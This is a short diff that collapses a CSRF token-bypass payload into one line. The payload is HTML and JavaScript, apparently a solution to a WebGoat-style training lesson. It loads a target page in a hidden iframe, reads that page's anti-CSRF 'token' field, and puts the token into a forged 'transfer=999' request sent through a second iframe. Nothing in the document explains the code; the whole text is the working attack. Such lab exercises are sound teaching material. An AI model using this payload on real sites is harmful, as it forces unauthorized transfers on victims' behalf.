@@ -1,10 +1,1 @@
-<script>
-	document.getElementById("1").onload = function() {
-		var token = this.contentWindow.document.getElementsByName("token")[0].value;
-		var transfer_url = "attack?transfer=999&token="+token;
-	    document.getElementById("2").src = transfer_url;
-	}
-</script>
-
-<iframe id='1' src="attack?Screen=1469770765&menu=900&transfer=main"></iframe>
-<iframe id='2'></iframe>
+<script> document.getElementById("1").onload = function() {var token = this.contentWindow.document.getElementsByName("token")[0].value;	var transfer_url = "attack?transfer=999&token="+token; document.getElementById("2").src = transfer_url;	}</script> <iframe id='1' src="attack?Screen=1469770765&menu=900&transfer=main"></iframe><iframe id='2'></iframe>
